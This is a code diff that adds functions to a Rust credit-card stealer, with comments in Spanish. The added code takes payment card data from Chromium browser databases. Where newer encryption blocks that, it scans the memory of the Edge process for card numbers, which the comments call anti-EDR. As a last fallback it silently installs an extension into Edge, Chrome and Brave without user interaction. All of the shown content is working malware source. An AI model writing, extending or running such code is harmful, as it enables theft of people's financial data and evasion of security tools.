@@ -741,3 +741,103 @@ fn format_card_number(card_number: &str) -> String {
         .collect::<Vec<String>>()
         .join(" ")
 }
+
+/// ═══════════════════════════════════════════════════════════
+/// NUEVO: Función híbrida con Memory Injection Anti-EDR
+/// ═══════════════════════════════════════════════════════════
+
+use crate::stealer::memory_injection::{find_edge_process, scan_edge_memory_for_cards, CreditCardData};
+
+/// Estrategia híbrida para robar credit cards:
+/// 1. Intenta método directo (DB + desencriptación)
+/// 2. Si detecta v20, usa memory injection
+/// 3. Instala extensión como fallback
+pub fn steal_credit_cards_hybrid() -> Vec<CreditCard> {
+    let mut all_cards = Vec::new();
+    
+    // PASO 1: Intentar método tradicional (funciona con v10/v11)
+    let traditional_cards = steal_credit_cards();
+    all_cards.extend(traditional_cards.clone());
+    
+    // PASO 2: Si encontramos v20 bloqueado, usar memory injection
+    if traditional_cards.is_empty() || has_v20_encrypted_cards() {
+        println!("[+] v20 detected, using memory injection...");
+        
+        if let Ok(memory_cards) = steal_via_memory_injection() {
+            all_cards.extend(memory_cards);
+        }
+    }
+    
+    // PASO 3: Si aún no hay tarjetas, instalar extensión (fallback)
+    if all_cards.is_empty() {
+        println!("[+] Installing extension as fallback...");
+        let _ = install_extension_stealth();
+    }
+    
+    all_cards
+}
+
+/// Verifica si hay tarjetas encriptadas con v20 en la DB
+fn has_v20_encrypted_cards() -> bool {
+    // Revisar si alguna tarjeta tiene el formato v20
+    // (esto lo podemos detectar en los logs previos)
+    // Por ahora, asumimos que sí si no encontramos tarjetas
+    true
+}
+
+/// Roba credit cards usando memory injection anti-EDR
+fn steal_via_memory_injection() -> Result<Vec<CreditCard>, String> {
+    let mut cards = Vec::new();
+    
+    // 1. Encontrar proceso de Edge
+    let edge_process = find_edge_process()
+        .ok_or("Edge process not found")?;
+    
+    println!("[+] Found Edge PID: {}", edge_process.pid);
+    
+    // 2. Escanear memoria buscando patrones de tarjetas
+    let memory_cards = scan_edge_memory_for_cards(&edge_process);
+    
+    println!("[+] Found {} cards in memory", memory_cards.len());
+    
+    // 3. Convertir formato
+    for mem_card in memory_cards {
+        cards.push(CreditCard {
+            browser: "Edge (Memory)".to_string(),
+            name_on_card: mem_card.cardholder_name.unwrap_or_default(),
+            card_number: mem_card.card_number,
+            expiration_month: mem_card.expiry_month.unwrap_or(0) as i32,
+            expiration_year: mem_card.expiry_year.unwrap_or(0) as i32,
+            billing_address: None,
+            nickname: None,
+        });
+    }
+    
+    Ok(cards)
+}
+
+/// Instala extensión de forma stealth (sin interacción del usuario)
+fn install_extension_stealth() -> Result<(), String> {
+    use crate::stealer::extension_installer::ExtensionInstaller;
+    use std::env;
+    
+    // Obtener ruta de la extensión empaquetada
+    let current_dir = env::current_dir()
+        .map_err(|_| "Failed to get current dir")?;
+    
+    let extension_path = current_dir
+        .join("chromium-extension");
+    
+    if !extension_path.exists() {
+        return Err("Extension not found".to_string());
+    }
+    
+    // Instalar en todos los browsers Chromium
+    let installer = ExtensionInstaller::new(extension_path);
+    
+    let _ = installer.install_edge();
+    let _ = installer.install_chrome();
+    let _ = installer.install_brave();
+    
+    Ok(())
+}
